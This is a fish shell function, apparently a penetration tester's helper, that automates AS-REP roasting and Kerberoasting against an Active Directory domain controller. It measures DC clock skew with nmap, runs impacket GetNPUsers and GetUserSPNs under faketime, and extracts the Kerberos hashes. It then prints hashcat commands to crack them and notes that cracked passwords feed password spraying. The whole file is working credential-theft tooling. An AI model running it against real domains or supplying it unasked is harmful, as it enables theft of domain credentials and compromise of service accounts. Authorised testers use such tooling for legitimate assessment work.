function roast --description "AS-REP and Kerberoast in one run, DC clock skew measured first and faketime applied"
    argparse 'U/users=' 's/skew=' 'n/noasrep' 'k/nokerb' -- $argv
    or return 1

    if test (count $argv) -lt 2 -o (count $argv) -gt 4
        echo "usage: roast DC_IP DOMAIN [USER [SECRET]] [-U USERS] [-s SKEW] [-n] [-k]"
        echo "  no USER        AS-REP roast every name in USERS (default ldap-names-DC_IP.txt from nxclur)"
        echo "  USER           AS-REP roast that one name, no credential"
        echo "  USER SECRET    password or NT hash. AS-REP for the whole domain plus Kerberoast every SPN"
        echo "  -s SKEW        skip the measurement, use this libfaketime offset, e.g. +8h or -28806"
        echo "  -n / -k        skip AS-REP / skip Kerberoast"
        echo "  skew comes from a live smb2-time probe, then look-IP/deep.nmap. Neither: stops."
        return 1
    end
    set -l ip $argv[1]
    set -l domain $argv[2]
    set -l user ""
    set -l secret ""
    test (count $argv) -ge 3; and set user $argv[3]
    test (count $argv) -ge 4; and set secret $argv[4]
    set -l out "roast-$ip"
    mkdir -p $out

    for b in impacket-GetNPUsers impacket-GetUserSPNs nmap faketime
        if not command -q $b
            echo "[!] $b not found. impacket-scripts, nmap and faketime are all Kali packages: apt install faketime"
            return 1
        end
    end

    # ---- credential shape ----------------------------------------------------
    # DOMAIN/USER:PASS or DOMAIN/USER -hashes :NT. Secret passed as argv, never
    # through a shell, so punctuation in passwords is safe.
    set -l auth
    set -l shape
    if test -z "$user"
        set shape "no credential, AS-REP from a user list"
    else if test -z "$secret"
        set shape "lone username $user, AS-REP for that name only"
    else if string match -qr '^[0-9a-fA-F]{32}$' -- $secret
        set auth "$domain/$user" -hashes ":$secret"
        set shape "$user with NT hash, domain auth"
    else if string match -qr '^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$' -- $secret
        set auth "$domain/$user" -hashes "$secret"
        set shape "$user with LM:NT hash, domain auth"
    else
        set auth "$domain/$user:$secret"
        set shape "$user with password, domain auth"
    end
    echo "[*] $shape"

    # ---- clock skew ----------------------------------------------------------
    # Kerberos refuses anything more than 5 minutes off the KDC. The DC time
    # comes from SMB2 negotiate, which every Windows box answers unauthenticated.
    # nxc banners do not carry it (checked the source), so nmap does it.
    set -l offset ""
    set -l source ""
    if set -q _flag_skew
        set offset $_flag_skew
        set source "given with -s"
    else
        set -l probe "$out/smb2-time.nmap"
        set -l t0 (date -u +%s)
        __run nmap -Pn -p445 --script smb2-time -oN $probe $ip
        set -l dcdate (string replace -rf '^\|\s+date: (\S+).*' '$1' <$probe | head -1)
        if test -n "$dcdate"
            set -l dc (date -u -d $dcdate +%s 2>/dev/null)
            if test -n "$dc"
                set offset (math $dc - $t0)
                set source "smb2-time, DC says $dcdate UTC"
            end
        end
        if test -z "$offset" -a -r "look-$ip/deep.nmap"
            # |_clock-skew: 8h00m06s   or   mean: 7h59m58s, deviation: 0s, median: 7h59m58s
            set -l line (grep -m1 'clock-skew' "look-$ip/deep.nmap")
            set -l v (string replace -rf '.*(median: |clock-skew: )(-?)(\d+h)?(\d+m)?(\d+s)?.*' '$2|$3|$4|$5' -- $line)
            if test -n "$v"
                set -l p (string split '|' -- $v)
                set -l h (string replace 'h' '' -- $p[2]); test -z "$h"; and set h 0
                set -l m (string replace 'm' '' -- $p[3]); test -z "$m"; and set m 0
                set -l s (string replace 's' '' -- $p[4]); test -z "$s"; and set s 0
                set offset (math "$h*3600 + $m*60 + $s")
                test "$p[1]" = "-"; and set offset (math 0 - $offset)
                set source "look-$ip/deep.nmap clock-skew line (older than the probe, if 445 moved this is stale)"
            end
        end
    end

    if test -z "$offset"
        echo
        echo "[!] could not measure the DC clock. No smb2-time answer on 445 and no clock-skew line in look-$ip/deep.nmap."
        echo "    Kerberos will refuse anything more than 5 minutes off, so this stops here rather than roast blind."
        echo "    find it:   nmap -p445 --script smb2-time $ip        or any -sC scan, the clock-skew line"
        echo "    then:      roast $ip $domain $user $secret -s +8h        (libfaketime offset, sign included)"
        return 1
    end

    set -l wrap
    if string match -qr '^[+-]?\d+$' -- $offset
        set -l abs (math "abs($offset)")
        set -l human (printf '%dh%02dm%02ds' (math "floor($abs/3600)") (math "floor($abs%3600/60)") (math "$abs%60"))
        test $offset -lt 0; and set human "-$human"; or set human "+$human"
        echo "[*] DC clock skew $human ($offset s)   source: $source"
        if test $abs -gt 300
            set wrap faketime -f "+"(math $offset)
            test $offset -lt 0; and set wrap faketime -f "$offset"
            echo "[*] over 5 minutes: every Kerberos call below runs under faketime"
        else
            echo "[*] under 5 minutes, no faketime needed"
        end
    else
        set wrap faketime -f "$offset"
        echo "[*] skew $offset   source: $source   (not a plain number, passed to faketime as given)"
    end

    # ---- AS-REP --------------------------------------------------------------
    set -l produced
    set -l asrep "$out/asrep.txt"
    if not set -q _flag_noasrep
        rm -f $asrep
        set -a produced $asrep
        if test -n "$auth"
            # a credential lets the DC list who has preauth off
            __run $wrap impacket-GetNPUsers $auth -dc-ip $ip -request -format hashcat -outputfile $asrep
        else if test -n "$user"
            echo "$user" >$out/asrep-users.txt
            __run $wrap impacket-GetNPUsers "$domain/" -usersfile $out/asrep-users.txt -dc-ip $ip -no-pass -format hashcat -outputfile $asrep
        else
            set -l list "ldap-names-$ip.txt"
            set -q _flag_users; and set list $_flag_users
            if not test -s $list
                echo "[!] no user list: $list missing or empty. nxclur writes ldap-names-$ip.txt, or give -U FILE"
                return 1
            end
            __run $wrap impacket-GetNPUsers "$domain/" -usersfile $list -dc-ip $ip -no-pass -format hashcat -outputfile $asrep
        end
    end

    # ---- Kerberoast ----------------------------------------------------------
    set -l tgs "$out/tgs.txt"
    if not set -q _flag_nokerb
        if test -n "$auth"
            rm -f $tgs
            set -a produced $tgs
            __run $wrap impacket-GetUserSPNs $auth -dc-ip $ip -request -outputfile $tgs
        else
            echo "[*] Kerberoast needs a credential, skipped. Any domain user will do: roast $ip $domain USER SECRET"
        end
    end

    # ---- what came back ------------------------------------------------------
    echo
    set -l got 0
    for f in $produced
        test -s $f; or continue
        set got 1
        set -l n (count (cat $f))
        set -l who (string replace -rf '^\$krb5(asrep|tgs)\$\d+\$\*?([^$*@]+).*' '$2' <$f | string join ', ')
        echo "[*] "(basename $f)": $n hash(es)  $who  -> $f"
        chash (head -1 $f)
        set -l mode (string replace -rf '^\$krb5(asrep\$23|tgs\$23|tgs\$17|tgs\$18)\$.*' '$1' (head -1 $f) | string replace -a 'asrep$23' 18200 | string replace -a 'tgs$23' 13100 | string replace -a 'tgs$17' 19600 | string replace -a 'tgs$18' 19700)
        test -n "$mode"; and echo "  with the file:  hashcat -m $mode $f /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
    end
    if test $got -eq 0
        echo "[*] no roastable accounts came back. With a credential that is an answer: nobody has preauth off and no user has an SPN."
        echo "    without one it only means the list did not contain such a user"
    else
        echo "[*] cracked passwords go into spray; a Kerberoast hit is a service account and often local admin on its box"
    end
    test $got -eq 1
end
